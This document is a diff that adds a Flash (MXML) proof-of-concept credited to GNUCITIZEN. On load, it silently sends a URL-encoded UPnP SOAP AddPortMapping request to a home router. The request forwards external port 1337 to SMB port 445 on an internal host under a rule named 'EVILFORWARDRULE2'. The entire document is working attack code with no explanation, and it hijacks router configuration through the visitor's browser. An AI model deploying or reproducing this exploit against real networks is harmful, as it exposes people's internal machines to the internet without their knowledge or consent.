@@ -1,0 +1,20 @@
+<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" creationComplete="onAppInit()">
+	<mx:Script>
+		/* Petko D. Petkov; pdp
+		 * GNUCITIZEN
+		 **/
+		import flash.net.*;
+
+		private function onAppInit():void
+		{
+			var r:URLRequest = new URLRequest('http://192.168.1.254/upnp/control/igd/wanpppcInternet');
+
+			r.method = 'POST';
+			r.data = unescape('%3C%3Fxml%20version%3D%221.0%22%3F%3E%3CSOAP-ENV%3AEnvelope%20xmlns%3ASOAP-ENV%3D%22http%3A//schemas.xmlsoap.org/soap/envelope/%22%20SOAP-ENV%3AencodingStyle%3D%22http%3A//schemas.xmlsoap.org/soap/encoding/%22%3E%3CSOAP-ENV%3ABody%3E%3Cm%3AAddPortMapping%20xmlns%3Am%3D%22urn%3Aschemas-upnp-org%3Aservice%3AWANPPPConnection%3A1%22%3E%3CNewRemoteHost%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22string%22%3E%3C/NewRemoteHost%3E%3CNewExternalPort%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22ui2%22%3E1337%3C/NewExternalPort%3E%3CNewProtocol%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22string%22%3ETCP%3C/NewProtocol%3E%3CNewInternalPort%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22ui2%22%3E445%3C/NewInternalPort%3E%3CNewInternalClient%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22string%22%3E192.168.1.64%3C/NewInternalClient%3E%3CNewEnabled%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22boolean%22%3E1%3C/NewEnabled%3E%3CNewPortMappingDescription%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22string%22%3EEVILFORWARDRULE2%3C/NewPortMappingDescription%3E%3CNewLeaseDuration%20xmlns%3Adt%3D%22urn%3Aschemas-microsoft-com%3Adatatypes%22%20dt%3Adt%3D%22ui4%22%3E0%3C/NewLeaseDuration%3E%3C/m%3AAddPortMapping%3E%3C/SOAP-ENV%3ABody%3E%3C/SOAP-ENV%3AEnvelope%3E');
+			r.contentType = 'application/xml';
+			r.requestHeaders.push(new URLRequestHeader('SOAPAction', '"urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping"'));
+
+			navigateToURL(r, '_self');
+		}
+	</mx:Script>
+</mx:Application>
